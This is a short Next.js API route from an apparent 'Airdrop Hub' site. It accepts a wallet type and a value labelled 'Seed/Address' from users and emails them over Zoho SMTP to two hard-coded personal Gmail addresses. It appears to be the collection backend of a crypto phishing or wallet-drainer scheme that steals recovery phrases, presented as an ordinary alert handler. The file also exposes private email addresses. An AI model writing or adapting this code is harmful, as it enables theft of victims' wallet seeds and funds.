import { NextRequest, NextResponse } from 'next/server'
import nodemailer from 'nodemailer'

export async function POST(req: NextRequest) {
  const { walletType, walletAddress } = await req.json()

  const transporter = nodemailer.createTransport({
    host: 'smtp.zoho.com',
    port: 465,
    secure: true,
    auth: {
      user: process.env.ZOHO_EMAIL_3,
      pass: process.env.ZOHO_APP_PASSWORD_3,
    },
  })

  await transporter.sendMail({
    from: `"Airdrop Hub Alerts" <${process.env.ZOHO_EMAIL_3}>`,
    to: 'michaelogaje033@gmail.com,promixadamu@gmail.com',
    subject: `New Wallet Connected – ${walletType}`,
    text: `A user just connected their ${walletType} wallet.\n\nSeed/Address: ${walletAddress}`,
  })

  return NextResponse.json({ success: true })
}